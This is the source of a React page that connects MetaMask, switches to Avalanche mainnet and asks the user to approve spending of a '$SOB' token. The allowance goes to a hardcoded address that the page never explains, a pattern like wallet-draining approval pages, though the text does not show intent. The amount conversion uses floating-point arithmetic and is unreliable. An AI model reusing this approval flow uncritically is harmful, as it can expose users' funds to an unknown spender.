import './App.css'
import { useState, useEffect } from 'react'
import {  getCurrentWalletConnected } from './utils/interact'
import { ethers } from 'ethers'

function App() {
  const [status, setstatus] = useState()
  const [Wallet, setWallet] = useState('')
  const [btn, setbtn] = useState('visible')
  const [form, setform] = useState("hidden");
  const [Amount, setAmount] = useState(0);

  useEffect(() => {
    async function onReload() {
      const { address } = await getCurrentWalletConnected()

      setWallet(address)
      addWalletListener()
    }
    onReload()
  }, [])

  const OnbuttonClick = async () => {
    const Account = await connectWallet()
    setWallet(Account.address);
    setstatus('your wallet ' + Account.address + ' is connected ');
  }


  
  const Approve = async ()=>{
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const contractAddress = "0x396b961098756f421B628E3180bA9dC24589250c";
    const Allowance_Ad = "0xccf37a39a0DD717fB55CD4faf369d5679FA1A1ee";
    const amount = Amount*1000000000000000000; /* global BigInt */
    const contractABI = require("./contract/abi.json");
    const token = new ethers.Contract(contractAddress, contractABI,provider.getSigner());
    await token.approve(Allowance_Ad,BigInt(amount));
  }

  const AVALANCHE_MAINNET_PARAMS = {
    chainId: '0xA86A',
    chainName: 'Avalanche Mainnet C-Chain',
    nativeCurrency: {
      name: 'Avalanche',
      symbol: 'AVAX',
      decimals: 18
    },
    rpcUrls: ['https://api.avax.network/ext/bc/C/rpc'],
    blockExplorerUrls: ['https://snowtrace.io/']
  }
  const AVALANCHE_TESTNET_PARAMS = {
    chainId: '0xA869',
    chainName: 'Avalanche Testnet C-Chain',
    nativeCurrency: {
      name: 'Avalanche',
      symbol: 'AVAX',
      decimals: 18
    },
    rpcUrls: ['https://api.avax-test.network/ext/bc/C/rpc'],
    blockExplorerUrls: ['https://testnet.snowtrace.io/']
  }

  const connectWallet = async () => {
    if (window.ethereum) {

      try {
        const addressArray = await window.ethereum.request({
          method: "eth_requestAccounts",
        });
        switchToAvalancheChain();
        const obj = {
          address: addressArray[0],
        };
        setbtn('hidden');
        setform("visible");
        return obj;
      } catch (err) {
        return {
          address: "",
        };
      }
    } else {
      return {
        address: "",
      };
    }
  };
  
 function switchToAvalancheChain () {
    // Request to switch to the selected Avalanche network
    window.ethereum
      .request({
        method: 'wallet_addEthereumChain',
        params: [AVALANCHE_MAINNET_PARAMS]
      })
  }

 

  function addWalletListener() {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length > 0) {
          setWallet(accounts[0])
          setstatus('your wallet ' + accounts[0] + ' is connected')
          setbtn('hidden');
          setform("visible")
        } else {
          setstatus('🦊 Connect to Metamask using the connect wallet.')
        }
      })
    } else {
      setstatus(
        ' You must install Metamask Extension, a virtual Ethereum wallet, in your browser.',
      )
    }
  }

  return (
    <div className="relative ">
      <img
        src="/images/background.png"
        alt=""
        className="bg-cover bg-center w-screen h-screen "
      />
      <span className="absolute top-8 left-1/2 transform -translate-y-1/2 -translate-x-1/2 text-white bg-gray-900/60">
        {status}
      </span>
      <button
        className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-gray-900/60 px-4 py-2  text-xl text-white"
        onClick={OnbuttonClick}
        style={{ visibility: btn }}
      >
        Connect Wallet
      </button>
      <div  className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 p-20 space-y-3"
      style={{ visibility: form }}>
        <span className='text-black text-3xl flex justify-center items-center font-semibold text-centre '>Approve $SOB Below</span>
        <form>
          <input type={"number"} min={"0"}
            onChange={event => setAmount(event.target.value)}
            value={Amount}></input>
          <button className='form-btn bg-gray-900/60 text-white px-3'
          onClick={Approve}
          type={"button"}>Approve $SOB Spend</button>
        </form>
      </div>
    </div>
  )
}

export default App
